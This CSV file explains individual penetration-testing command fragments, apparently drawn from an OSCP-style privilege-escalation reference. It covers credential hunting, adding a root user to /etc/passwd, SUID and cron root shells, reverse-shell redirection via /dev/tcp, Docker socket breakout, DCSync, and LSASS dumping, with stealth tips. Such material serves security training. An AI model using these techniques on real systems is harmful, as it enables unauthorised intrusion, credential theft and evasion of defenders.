"id","flag","explanation"
"df5905b3758a867a","systeminfo","Built-in Windows command that displays comprehensive system information. Key fields: OS Name/Version (determines exploit compatibility), System Type (x64/x86 architecture), Hotfix(s) (missing patches = vulnerabilities), Network Card(s) (interfaces for pivoting). Works on all Windows versions. Critical for kernel exploit research and exam planning."
"451f2833cb116f81","route print","Windows command to display kernel IP routing table. Shows: Interface List (NICs), IPv4 Route Table, IPv6 Route Table. Key information: Network destinations reachable from this host, gateways used for each destination. Reveals hidden networks or VPN routes not obvious from ipconfig."
"422ac957b802479c","HKLM:\SOFTWARE\Wow6432Node\...\Uninstall\*","Registry path for 32-bit applications on 64-bit Windows. Wow6432Node is the Windows-on-Windows 64-bit compatibility layer where 32-bit app info is stored."
"a4b94c96da2cda23","HKLM:\SOFTWARE\Microsoft\...\Uninstall\*","Registry path for 64-bit (native) applications. Contains application metadata including DisplayName, DisplayVersion, Publisher."
"4f29c9a1293de3aa","select displayname","Filter output to show only application names. Makes output readable. Can also use select displayname, displayversion for versions."
"803bc28085e74554","-Path C:\","Starting directory for recursive search. C:\ searches entire drive. Can narrow to C:\Users\ for faster search."
"bfe89693607de513","-Include *.kdbx","Filter for KeePass database file extension. KeePass 2.x uses .kdbx format. KeePass 1.x used .kdb (less common)."
"d97fc6e3098f85d7","-Path C:\xampp","Target directory for search. Change based on installed applications (e.g., C:\inetpub, C:\wamp, C:\Program Files\MySQL)."
"c022c3c7b342233a","-Include *.txt,*.ini","File extensions commonly containing credentials. Add *.xml,*.config,*.cfg for broader search."
"347c57540a4595a5","-Path C:\Users\<USERNAME>\","User's home directory. Replace with actual username. For current user: $env:USERPROFILE or C:\Users\$env:USERNAME\"
"6245d4cc4ba94653","-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx","Common document types. Text files often contain notes/passwords. Excel may have password lists. Word may have credentials in documentation."
"2e58a27de37b03e9","Get-History","PowerShell cmdlet that displays command history for the CURRENT SESSION ONLY. This history is stored in memory and lost when session closes. For persistent history (commands from previous sessions), check PSReadline history file. Users often clear this with Clear-History, thinking it removes all traces - it doesn't affect PSReadline."
"267ae5c14ed5cb28","(Get-PSReadlineOption)","Returns PSReadline module options including history settings. Wrapping in parentheses allows property access."
"aef259126afd5f12",".HistorySavePath","Property containing the full path to the history file. Default: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
"9f9bf858b190991f","type","Windows command to display file contents. Alias for Get-Content in PowerShell. Can also use cat (PowerShell alias) or Get-Content."
"38eb0030ef939220","ConsoleHost_history.txt","PSReadline's persistent history file. Contains ALL commands from ALL PowerShell sessions. Survives Clear-History, reboots, and session closures."
"15e6857d68830213","-Path C:\Users\","Starting directory. Transcripts are often saved in user directories or C:\Users\Public\."
"5fd21a0da6c7a54d","-Include *transcript*,*PowerShell_transcript*","Search patterns for transcript files. PowerShell default naming includes 'PowerShell_transcript' prefix."
"94f887321149e747","/user:<USERNAME>","Specifies the user account to run the program as. Format can be: username (local), HOSTNAME\username (explicit local), or DOMAIN\username (domain). You will be prompted for the password interactively."
"e667f1e8a0ba897c","cmd","The program to run as the specified user. Can be any executable. Common choices: cmd (command prompt), powershell (PowerShell), or direct program paths."
"464b293ced82c98c","cat /etc/shadow","Read shadow password file (requires root). Tests read access to root-protected files."
"791de86035c0dda8","| head -n 3","Show first 3 lines only (root, daemon, bin users). Reduces output clutter while proving access."
"832e3a979c86dd04","quiet","Reduce output verbosity"
"221f57561766a798","notcolor","Disable colored output"
"aa68ad368822cb3d","Invoke-AllChecks","Run all PowerUp checks"
"9939ee4cd5ced600","hostname","Display computer name"
"3c189219852ba89f","whoami /all","Display user, groups, and privileges"
"bd62bcd677b550db","wmic service get","Query service properties"
"f1443c5bbb870580","findstr /i auto","Filter for auto-start services (case-insensitive)"
"29e86d25c32631d1","findstr /i /v","Exclude lines containing pattern"
"08fac99a93293d19","/v """"""""","Exclude properly quoted paths"
"36b73020f83d49d5","HKCU","HKEY_CURRENT_USER registry hive"
"f0978c24ebd76886","HKLM","HKEY_LOCAL_MACHINE registry hive"
"39a941823bbf0ebe","/f password","Search for 'password' string"
"bd7a16f0e26afe1b","/t REG_SZ","Search in string values only"
"8c82c199c98ab82b","dir tasks","List task files directly"
"a15a9588e1030be3","dir /s /b","Search subdirectories, bare format"
"8873d1bbedc0da10","C:\*.dll","Find all DLL files"
"cc74de79e840f16a","findstr /v","Exclude Windows directory"
"70dd49bff9a43833","whoami /priv","List user privileges"
"182507ef0a127773","findstr /i","Case-insensitive search"
"071ff96f9b9e7bb4","SeImpersonate","Impersonate a client after authentication"
"9e7680f4bc1290c2","SeAssignPrimaryToken","Replace process-level token"
"9e0db0782359c7f5","cmdkey /list","List saved credentials"
"544db8ed901dc4ab","AppData\Local\Credentials","Local credential storage"
"326773df56f4b822","AppData\Roaming\Credentials","Roaming credential storage"
"6c817815449b1a5a","C:\*password*","Files with 'password' in name"
"86947baa76213074","whoami /groups","Display current user's groups"
"34fcdfc8caba69b4","findstr","Filter output for specific lines"
"1897379176b45bde","/B","Match beginning of line"
"253ce6ee8e4547a0","/C:","Literal search string"
"ccbf531bc3b021da","\""""","Find paths without quotes"
"3ea5e4b6d762f03a","/accepteula","Auto accept EULA"
"fc23e87118cf4c3d","SAM","Security Account Manager database"
"ba860178dd1e427c","SYSTEM","System registry hive"
"f39d2a6f03ca104e","/list","Display all stored credentials"
"9487740162a6173b","cmdkey","Windows credential manager CLI"
"bdd67667095e3fd5","Protect","DPAPI master keys location"
"09658de541d426d4","Winlogon","Windows logon configuration"
"d544d9ebe907e239","%PATH%","System PATH variable"
"448474c61f7e47e3","where /r","Recursive file search"
"03d8384684787400","*.dll","Search for DLL files"
"8dd1bebf78ff1eba","-SearchBase","LDAP path to search within (e.g., 'OU=Users,DC=domain,DC=local')"
"d91d4128cac0d89c","-Recursive","Expand nested groups to show all effective members"
"8479ac29ffcac879","-ClassName","WMI class name to query (e.g., Win32_Process, Win32_Service)"
"012c785dd77d8190","-Namespace","WMI namespace (default: root\cimv2)"
"1e16d50b972d3c2b","-Property","Specific properties to retrieve (e.g., -Property OsName,OsVersion)"
"c76dc11b9b5884fe","-Path","Registry path using PowerShell drive notation (HKLM:, HKCU:, HKCR:, HKU:, HKCC:)"
"26aededf337c7387","-Name","Specific property name to retrieve (omit for all properties)"
"af6f74a61284bfd6","-TaskPath","Filter by task path (e.g., \Microsoft\Windows\)"
"d95fe8c2818ca74d","-Id","Filter by PID"
"0449a8d689a1be5e","-DisplayName","Filter by display name"
"1005da523acb81d9","-Description","Filter by update type"
"1ebf4f7e9c2430be","--format=bcrypt","Specify hash format as bcrypt - CRITICAL for bcrypt hashes. Without this, John may misdetect hash type. Bcrypt format: $2a$, $2b$, $2y$ (algorithm identifier) + cost factor + 22-char salt + 31-char hash. Very slow by design (defense against brute force)"
"728ac316a95418dd","-","Login shell - Provides full login environment (PATH, HOME, SHELL, etc.) as if user logged in directly. Without hyphen, retains current environment which may cause permission issues or missing binaries. ALWAYS use hyphen for clean environment"
"06eee4a96db7a166","-Command","Execute PowerShell command string (alternative: -c)"
"c435c38fb024cfe8","Start-Process","Starts one or more processes on local computer - similar to Unix exec but with elevation support"
"56439f17443ebdc4","powershell","Target process to start - can be any executable (cmd.exe, notepad.exe, etc.)"
"8897e92cf60b6471","-Verb RunAs","Requests administrative privileges via UAC prompt - equivalent to 'Run as Administrator' right-click"
"aa34d73d6664b217","-WindowStyle Hidden","Optional: Hide the window during execution (Normal|Minimized|Maximized|Hidden)"
"12ce2ae8aaaae402","-Wait","Optional: Wait for process to complete before returning control"
"394b673bf6b90c11","-NoNewWindow","Optional: Run in same console window (doesn't work with -Verb RunAs)"
"d214332f401de8e5","-ArgumentList","Array of arguments passed to new PowerShell process. Use comma-separated strings for multiple arguments."
"753406e055c5f3c1","'-Command'","First argument: tells new PowerShell to execute a command (alternative: -File for scripts)"
"2a64be8d4b8ec9ee","'<COMMAND> > <FILE>'","Second argument: actual command with output redirection. Single quotes prevent expansion in current shell."
"5e81ce6d4a18f0ca","-PassThru","Optional: Return Process object for the spawned process (allows monitoring PID, exit code)"
"34abad84fc8e0e8f","-NoExit","Keep PowerShell window open after command executes (default behavior closes window immediately)"
"07da1c8c83472166","'-Command','cd C:\\'","Initial command to run - use cd to set working directory, or any setup command. Double backslash needed for escaping."
"f1cd15cd44cc7734","-ExecutionPolicy Bypass","Optional: Add as argument to bypass script execution restrictions in elevated session"
"eed8d90c7a0bed94","-NoProfile","Optional: Don't load PowerShell profile (faster startup, cleaner environment)"
"a5b2a1fde8fa43c8","Escaped quotes \""","Double-backslash quote needed when nested in ArgumentList string - prevents premature quote termination"
"5d0dde0d97bdd30d","result=$(...)","Command substitution - stores find output in variable for conditional logic"
"08e24c0057fa0948","-regex","Use regex pattern matching on full path"
"96d1b60f75cb8735",".*\(flag\|proof\)\.txt","Match paths ending in flag.txt OR proof.txt"
"fd2577e423ce6ae9","[ -n ""$result"" ]","Test if result string is non-empty"
"ae7a197480533c33","grep -rlE","Recursive (-r), list files only (-l), extended regex (-E)"
"119eef25fe9f6dfc","OS\{[a-fA-F0-9]{32}\}","Match OS{ followed by 32 hex chars and } (OSCP flag format)"
"6d59832458948546","U=""root2"" P=""w00t""","Set variables for username and password (customize as needed)"
"633b883d0fd4424e","[ -w /etc/passwd ]","Test if /etc/passwd is writable by current user"
"7d1dbb06785b01d6","! grep -q ""^$U:""","Check user doesn't already exist (! inverts, -q quiet mode)"
"a2892be12cbe1174","$(openssl passwd $P)","Generate DES password hash inline (avoids copy/paste errors)"
"50c655918e462369","0:0","UID:GID of 0 = root privileges"
"2a0c1de9a5803791","root:/root:/bin/bash","GECOS field, home directory, login shell"
"2260cc8ab700cd5f",">> /etc/passwd","Append to passwd file (don't overwrite!)"
"3aa468ed394dcd9b","su $U","Switch to new user (will prompt for password)"
"f3dbab45995caaa0","echo ""=== SUID ===""","Section header for readability"
"a2a0cd073f047b0c","-perm -2000","Find files with SGID bit set (2 in octal = setgid)"
"9da5da0c0511b225","echo -e ""\n""","Print newline for spacing between sections (-e enables escape sequences)"
"b25837b626162126","getcap -r /","Recursively list files with capabilities from root"
"bb14a623149becf0","-user root","Only SUID binaries owned by root (most useful for privesc)"
"9e111ba48866cf43","GTFO=""...""","Variable containing known exploitable binary names"
"9e44bf37c6b21404","grep -E","Extended regex mode for alternation patterns"
"0a6209a890c3d75a","($GTFO)","Capture group containing the binary list"
"173aa958472956a2","for bin in $(...)","Loop through each binary found"
"1b929df4df28280c","xargs -I {} basename {}","Extract just the filename from full path"
"93eb245b23e1a9bf","echo ""=== $bin ===""","Print header for each binary"
"996c2ab4adb6a1e4","searchsploit $bin","Search exploit-db for binary name"
"5595d6967a8757c2","head -5","Limit to first 5 results per binary"
"1305ed949cf2dc48","/var/spool/cron/crontabs/*","User crontabs (alternative: /var/spool/cron/*)"
"25a350f296cf87d2","$(which find)","Command substitution to get full path of binary"
"aca025bc2ceccd61","grep -q 'rws'","Quiet grep for SUID pattern (r=read, w=write, s=suid+execute)"
"ba754a39085885b1","cp /bin/bash /tmp/rootbash","Copy bash binary to writable location (cron runs as root so copy preserves ownership)"
"c798380e72a8888d","chmod +s","Set SUID bit so binary runs with owner privileges (root)"
"d0fcd12f6e68bf95","sleep 65","Wait for cron to execute (most cron jobs run every minute)"
"065a4ef4231a9946","/tmp/rootbash -p","Execute SUID bash with -p flag to preserve effective UID (euid=0)"
"b39112ff6e9454cb","bash -i","Interactive bash shell"
"1a3d5c8b39033159",">& /dev/tcp/","Redirect stdout and stderr to TCP connection"
"f972d074706f8763","0>&1","Redirect stdin to same connection (full duplex shell)"
"849056040b4a7c40","-exec","Execute command for each match (or just once with -quit)"
"4b9a02ba1c246101","/bin/bash -p","Spawn bash preserving effective UID (euid=0)"
"04c820174d166572","\;","Terminate -exec command (escaped semicolon)"
"a035d33189976c8e","-quit","Exit after first execution (prevents spawning multiple shells)"
"14d172994cd7ca46","C:\*cred*","Search for 'cred' - finds: credentials.xml, cred.txt, stored_credentials.dat, etc."
"80e29ed7d21abc03","C:\*vnc*","VNC credential files - VNC servers store passwords in registry or .vnc files (often weakly encrypted). Examples: ultravnc.ini, vnc_config.xml."
"86be9184f2076740","C:\*.config","Configuration files - often contain database connection strings, API keys, service account passwords in plaintext. Examples: web.config, app.config, hibernate.cfg.xml."
"6de976a2a6a00a47","Add-Type -AssemblyName System.Windows.Forms","Load .NET Windows Forms library for screen access. Provides Screen class to get display information."
"f669a942ec8b72f9","[System.Windows.Forms.Screen]::PrimaryScreen.Bounds","Get primary monitor dimensions (width, height, position). For multi-monitor, captures only primary display."
"e845fdc371c35c58","New-Object System.Drawing.Bitmap","Create in-memory bitmap image object with screen dimensions. Image stored in RAM before saving to disk."
"30f22f2b61d12c20","$graphics.CopyFromScreen()","Capture screen content into bitmap. Copies pixel data from display buffer. Requires active desktop session (doesn't work over SSH/WinRM, only RDP/console)."
"f6f13e1ca97336ff","$bitmap.Save('C:\\Temp\\screenshot.png')","Save bitmap to PNG file. Can use any writable directory. PNG format provides good compression without quality loss. Alternative formats: JPEG (smaller file), BMP (larger file)."
"20e545e362fa08cd","C:\\Temp\\screenshot.png","Output file path. Use writable directory like C:\Temp\, C:\Users\Public\, or %TEMP%. OPSEC: Delete after exfiltration."
"d124c278ce0a48e7","\\\\<TARGET>\\<SHARE>","UNC path to remote share. FORMAT: \\\\hostname\sharename. Common shares: C$ (admin share for C: drive), ADMIN$ (C:\Windows), IPC$ (inter-process communication), SYSVOL (domain shares), NETLOGON (logon scripts). Custom shares: \\\\server\Data, \\\\server\Backup, etc."
"dcd6a4ad5ad2f321","/user:<DOMAIN>\\<USERNAME>","Authentication credentials. FORMAT: DOMAIN\username or .\username (local). Examples: /user:CORP\administrator (domain admin), /user:.\administrator (local admin), /user:CORP.COM\user@corp.com (UPN format)."
"20d8f75ccda11b9a","<PASSWORD>","Plaintext password. OPSEC WARNING: Password appears in command line (logged in Event ID 4688, visible in process list). For stealth, use PowerShell SecureString or runas /netonly."
"331e1865cbc31bee","Optional: /persistent:no","Don't persist connection after reboot. Default: /persistent:yes (reconnects at logon). Use /persistent:no for temporary connections during engagement."
"22e60295781f9cff","Optional: <DRIVE_LETTER>:","Assign drive letter. Example: net use Z: \\\\<TARGET>\C$ /user:<USER> <PASS>. Access as Z:\ instead of full UNC path. Useful for scripts expecting drive letters."
"a0b5695a312fba19","purge","Delete ALL Kerberos tickets from current session. Clears both TGTs and TGSs. CRITICAL before loading Golden/Silver tickets - ensures old tickets don't interfere. Equivalent to Linux: kdestroy or Mimikatz: kerberos::purge."
"90518b66844c73e7","psexec.exe","Sysinternals PSExec - remote execution and privilege escalation tool. Microsoft-signed legitimate admin utility. CRITICAL: Works locally to elevate Administrator → SYSTEM. Requires Administrator rights to execute. Download: https://docs.microsoft.com/sysinternals/downloads/psexec"
"fc35c7d64ef91ab9","Get-NetUser","PowerView cmdlet that queries Active Directory for user objects. Part of PowerSploit/PowerView toolkit. ADVANTAGE: Works from unprivileged domain user account. Returns rich AD user information including SPNs, group memberships, password policies, etc."
"77b402cc49ff5db8","Select-Object samaccountname,serviceprincipalname","Display only username and SPN fields. samaccountname = Windows username (e.g., sqlservice). serviceprincipalname = SPN value (e.g., MSSQLSvc/sql01.corp.com:1433). Reduces output noise - full Get-NetUser returns 50+ fields per user."
"df6036600d13b07c","Get-ObjectAcl","PowerView cmdlet that retrieves Access Control List (ACL) for AD objects. Shows permissions/rights granted to users/groups on AD objects. CRITICAL: DCSync requires specific extended rights on domain root object."
"91d9b874dd0c35b3","Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes'}","Filter for replication rights. DCSync requires: DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All. Both rights needed for full DCSync (all users). Single right = partial DCSync (specific users)."
"4447a7b5e0c96f13","SecurityIdentifier","SID of principal with DCSync rights. Convert to username with: ConvertFrom-SID <SID>. Default: Domain Admins (S-1-5-21-<domain>-512), Enterprise Admins, Administrators."
"0724fee0593c8049","ObjectAceType","Specific extended right name. DS-Replication-Get-Changes = basic replication. DS-Replication-Get-Changes-All = full domain replication (includes krbtgt)."
"368f06d28b5d17be","cmd /c","Execute CMD command from PowerShell - required because dir/findstr are CMD builtins"
"d8c055dbebd25a6b","2>nul","Redirect stderr to null - suppresses 'Access Denied' errors"
"ba7b5bec9107179a","& if errorlevel 1","CMD fallback - runs findstr only if dir found nothing (errorlevel 1)"
"a26d00d313f35921","findstr /s","Recursive string search through files"
"a66f00b94359a20d","findstr /m","Print only filename (not matching line content)"
"2b73922fc00fe71c","Write-Host ... -ForegroundColor Cyan","Visual section headers for clarity during search"
"6fab0303c15c71dc","Get-ChildItem -Path C:\ -Recurse","Recursive filesystem search from root"
"20fb4b71cf85f690","-Include *flag*.txt,*proof*.txt,*local*.txt","Match common OSCP flag filenames"
"4a75cdf3faf05a3d","ForEach-Object { Get-Content $_.FullName }","Display file contents when found"
"07bd7fd4f3e1260c","Get-ChildItem -Path HKLM:\SOFTWARE,HKCU:\SOFTWARE","Search both machine and user registry hives"
"af8d0aed2bc52265","Get-ItemProperty $_.PSPath","Read all values from each registry key"
"c745e57430cc26a2","$_.Value -match 'OS\{[a-fA-F0-9]{32}\}'","Regex match for OSCP flag format in registry values"
"42881475bfcea02b","Get-ChildItem Env:","Enumerate all environment variables"
"5ade5a04df218d85","[FILE], [REG], [ENV] prefixes","Indicate source location of found flags"
"21687239874eec30","$f=...","Store search results in variable for conditional logic"
"068a9f4e5c8459d1","Get-ChildItem -Recurse","Recursive filesystem search"
"cf0eabe5393391c3","-Include *flag*.txt,*proof*.txt","Filter to flag/proof filenames"
"8561f1e7b474c41f","Select-String -Pattern 'OS\{...\}'","Fallback content search for flag pattern"
"537c1176fa609629","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","Registry path for 64-bit installed applications"
"927e1a9034572e09","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","Registry path for 32-bit applications on 64-bit Windows (WoW64 redirection)"
"b2a80587a1bdb980","Select-Object DisplayName,DisplayVersion,Publisher","Extract only relevant fields - app name, version, vendor"
"77ac41a1f4f745af","Sort-Object DisplayName","Alphabetical sorting for easier review"
"f38d3cc3bf3617b2","Where-Object {$_.Path}","Filter to only processes with a valid path (excludes system processes without paths)"
"2c36f0891cd82467","Select-Object ProcessName,Id,Path","Extract process name, PID, and full executable path"
"18e7b017a3e14494","Sort-Object Path","Sort by path to group processes from same directory"
"a907ac02f1d4a79d","Get-WmiObject Win32_Process","Query WMI for process information (more details than Get-Process)"
"e78051b16751446e","-Wrap","Wrap long command lines instead of truncating"
"a729946c2131bc27","$_.Path -notlike 'C:\Windows\*'","Exclude Windows system processes to focus on third-party software"
"e49e90b41a59c2e0","-Path <SEARCH_PATH>","Starting directory for recursive search (C:\ for full drive)"
"56d9607b0e5258ea","-Path <APP_PATH>","Application installation directory (e.g., C:\xampp, C:\Program Files\AppName)"
"4987c0bcd5b240a2","-Include *.txt,*.ini,*.conf,*.config,*.xml,*.json","Common configuration file extensions"
"9b7963ceff1fbdd6","-Path <USER_PATH>","User home directory (C:\Users\username\)"
"7b6117a7b84e0884","-Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup*","Common patterns for sensitive files"
"4b53c5caa281ddb0","-Include *.ini,*.config,*.xml,*.conf,web.config,*.json","Common configuration file extensions"
"2c8daf2c9d9a8cbe","Get-CimInstance","Modern PowerShell cmdlet to query WMI classes (supersedes Get-WmiObject)"
"9490cc2f50d90887","-ClassName win32_service","Query the Win32_Service WMI class containing all service information"
"0c1ed51b9e3231ea","Select Name,State,PathName","Return only service name, current state, and binary path"
"2d719411869608ba","Where-Object {$_.State -like 'Running'}","Filter to show only services currently in Running state"
"5606a1b624939cad","""<BINARY_PATH>""","Path to file - quotes required for paths with spaces"
"d8ef949e984e4f19","Get-CimInstance -ClassName win32_service","Query WMI for service information"
"c243dfbdec026ae9","Select Name, StartMode","Return service name and startup configuration"
"04b1b7e695c6bd67","Where-Object {$_.Name -like '<SERVICE_NAME>'}","Filter for specific service name"
"93af7efbe2040692","net stop","Windows command to stop a running service"
"4989e5187fda1a7a","<SERVICE_NAME>","Service name (not display name)"
"11a4cd0acdca83a6","net start","Windows command to start a stopped service"
"3f27674ce33dae0c","shutdown","Windows shutdown utility"
"067ad0d8e1b2c32b","/r","Reboot after shutdown (instead of power off)"
"1a5c4d1a8a75152a","/t 0","Timeout in seconds before action (0 = immediate)"
"3772155d850995da","move","Rename/move file (atomic operation, preserves timestamps better than copy)"
"446458541300ff69","x86_64-w64-mingw32-gcc","MinGW-w64 cross-compiler for 64-bit Windows targets"
"f1242729a106cb17","adduser.c","Source file containing adduser code"
"d39595aa421596a7","-o adduser.exe","Output filename for compiled executable"
"f2f0b080a9db8d4b","-p windows/x64/shell_reverse_tcp","Payload: Windows 64-bit reverse TCP shell"
"2dc9c05671ca6bff","LHOST=","Listener host (attacker IP)"
"d35d4d79269c3ded","LPORT=","Listener port"
"c09ab53fea13a729","-f exe","Output format: Windows executable"
"3caf5d482d668162","-o service.exe","Output filename"
"24d919fc3e4f7a5c","Get-ModifiableServiceFile","PowerUp function that enumerates services, checks binary permissions, and returns exploitable targets"
"8139e52fa488c734","Install-ServiceBinary","PowerUp function to replace service binary with payload"
"d7722bef64961bf3","-uri","URL to download from"
"534c0208c0453e12","-Outfile","Local path to save downloaded file"
"a86920bc61e7fc6a","NOPASSWD","Commands runnable without password - major win"
"43ec849ab0d1e7bc","(ALL)","Can run as any user (typically root)"
"1016e3f793775bbb","<SUDO_BINARY>","Binary with NOPASSWD sudo access (replaced from parser)"
"dc8a799f81bd6783","<EXPLOIT_FLAGS>","GTFOBins exploitation technique (varies by binary)"
"cf76aec9cbe9d244","/bin/bash","Spawn bash shell (runs as root via sudo)"
"4648a6c62e1b3b07","vim","Text editor (GTFOBins-exploitable)"
"211333fcc0b39946","':!/bin/bash'","Vim command: run shell command (! = execute, /bin/bash = shell)"
"a3b4ca16774116a3","python","Python interpreter (GTFOBins-exploitable)"
"6984541b3d995e72","'import os; os.system(""/bin/bash"")'","Python code: import os module, execute /bin/bash shell"
"03fa6bfb17486ce6","less","File pager (GTFOBins-exploitable)"
"e578a452b38e8d60","/etc/profile","Any readable file (needed to open less)"
"38781dfc85f64069","!bash","(After less opens) Execute shell command from less prompt"
"262b0be0e078fa21","nmap","Network scanner (GTFOBins-exploitable on old versions)"
"9598862dda723e2b","--interactive","Enter interactive mode (removed in nmap 5.21+)"
"57ad05468a05b2ac","!sh","(After interactive mode) Execute shell command"
"3e9a5960da56d8ee","> /dev/null 2>&1","Redirect output and errors to null (silent test)"
"7dfeb3d8bdcbaf9f","-Include *.txt,*.ini,*.config,*.xml","Common configuration file extensions. INI files contain settings, TXT may have default passwords, CONFIG files (ASP.NET) have connection strings, XML for various app configs. Adjust based on target application."
"afe91f9298969ca4","-Include unattend.xml,sysprep.xml,sysprep.inf,Unattended.xml","Target Windows unattended installation answer files. These contain settings for automated Windows deployment including admin credentials. Multiple variants exist: unattend.xml (modern), sysprep.inf (legacy), Unattended.xml (alternate naming)."
"361d788ca565ab1b","-Path <WEB_ROOT>","Web server document root. Common paths: IIS=C:\inetpub\wwwroot, XAMPP=C:\xampp\htdocs, WAMP=C:\wamp64\www, Custom=identify from httpd.conf or running processes"
"f82ae1b2e6877160","-Include web.config,*.config,config.php,wp-config.php,settings.py,appsettings.json","Common web config files by technology: ASP.NET (web.config, appsettings.json), PHP (config.php, wp-config.php for WordPress), Python (settings.py for Django). Adjust based on identified web stack."
"5ff933cf6ef894e8","-Include *password*,*cred*,*secret*,*login*,*backup*.txt,*backup*.xlsx","Pattern matching for common credential file names. Users create files like 'passwords.txt', 'my_credentials.doc', 'secret_backup.xlsx', 'login_info.txt'. Asterisks match any characters before/after."
"6cc4e556b8c24071","-Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'","Registry path for Windows logon settings. AutoLogon credentials stored here for unattended login. HKLM (HKEY_LOCAL_MACHINE) readable by all users."
"9f40705724d2b780","Select-Object DefaultUserName,DefaultPassword,DefaultDomainName,AutoAdminLogon","Filter output to credential-related values. DefaultUserName=account, DefaultPassword=cleartext password (if set), DefaultDomainName=domain/workgroup, AutoAdminLogon=1 means enabled."
"a99d631a1c394efa","/var/run/docker.sock","Unix socket Docker daemon listens on"
"3e994c14e0fe8ac6","docker images","Show all locally cached Docker images"
"1e3986144e8cc3a5","-v /:/mnt","Mount host root filesystem at /mnt inside container"
"777fa8f4d6701058","--rm","Automatically remove container when it exits (cleanup)"
"d43f6a613a90ec76","-it","Interactive terminal with TTY allocation"
"5a4412b2f6fcdbe4","chroot /mnt","Change root to mounted host filesystem"
"7bad7653e54912e0","cat /mnt/etc/shadow","Read shadow file (root-only) to confirm access"
"aae49a312cd24693","ls -la /mnt/root","List root home directory contents"
"745de23aad64b671","cat /mnt/root/.ssh/id_rsa","Attempt to read root SSH private key"
"535246063cee91b6","--privileged","Give extended privileges to container (access to all host devices)"
"f2fc651d139035a8","-v /var/run/docker.sock:/var/run/docker.sock","Mount host Docker socket inside container"
"0f93a6b61110f6f1","docker pull","Download image from Docker Hub"
"0cf1e6cb637f3a58","alpine","Minimal Linux distribution (5MB)"
"fa73cfabb7ed01a9","grep -vE","Invert match (-v) with extended regex (-E) to exclude patterns"
"a5750b51cdd43731","(pattern|pattern)","Regex alternation - match any of these patterns"
"67b9064ddfa2c11a","/usr/bin/find","Full path to SUID find binary (replace with discovered path)"
"203169ebe3f5d6a0","procdump64.exe","Microsoft Sysinternals legitimate debugging tool for creating process memory dumps. LEGITIMACY: Part of Sysinternals suite, Microsoft-signed binary, used by IT administrators for troubleshooting application crashes. WHY AV BYPASS: Procdump itself is benign - creates memory dumps for any process. Using it for LSASS is suspicious but not blocked by most AV. No credential extraction happens on target (only memory copy). Download from: https://docs.microsoft.com/en-us/sysinternals/downloads/procdump OR Evil-WinRM upload."
"ad8682b0503909cf","pypykatz","Python implementation of Mimikatz credential extraction functionality. ADVANTAGES: (1) Runs natively on Linux (Kali, Ubuntu, etc.) without Wine or Windows VM. (2) Not flagged by Windows Defender (never executes on target). (3) Open-source, auditable code. (4) Actively maintained by SkelSec. INSTALLATION: Kali default (sudo apt install pypykatz) OR pip3 install pypykatz. CAPABILITIES: Parses LSASS dumps, SAM/LSA registry hives, Kerberos ccache files. Equivalent to Mimikatz sekurlsa::logonpasswords for offline analysis."
"91068928671a7a15","lsa minidump","Subcommand for parsing LSA (LSASS) memory dumps. 'lsa' module = Local Security Authority credential extraction. 'minidump' format = Windows MiniDump format (.dmp files from procdump, Task Manager, comsvcs.dll). WHY MINIDUMP: Windows crash dumps and process dumps use standardized MiniDump format containing full or partial process memory. Pypykatz reads this format to extract credential structures (Kerberos, NTLM, WDigest, CredSSP, etc.) same as Mimikatz on Windows."
"6ba749d38d3cd02b","<LSASS_PID>","Process ID of lsass.exe to dump. FIND PID: tasklist /fi ""imagename eq lsass.exe"" (shows PID in second column) OR Get-Process lsass | Select-Object Id OR wmic process where name='lsass.exe' get ProcessId. TYPICAL RANGE: 600-800 on most systems (LSASS starts early in boot). CRITICAL: Use exact PID, wrong PID dumps wrong process (no credentials)."
"4ff56b78db927845","C:\Temp\lsass.dmp","Output path for memory dump. LOCATION: Must be writable by current user. Recommended paths: C:\Windows\Temp\, C:\Temp\ (create if needed: mkdir C:\Temp), C:\Users\<USER>\AppData\Local\Temp\. FILE SIZE: 40-200MB (same as procdump). OPSEC: Use inconspicuous filename or temp location. Example: C:\Windows\Temp\debug.dmp (blends with legitimate crash dumps)."
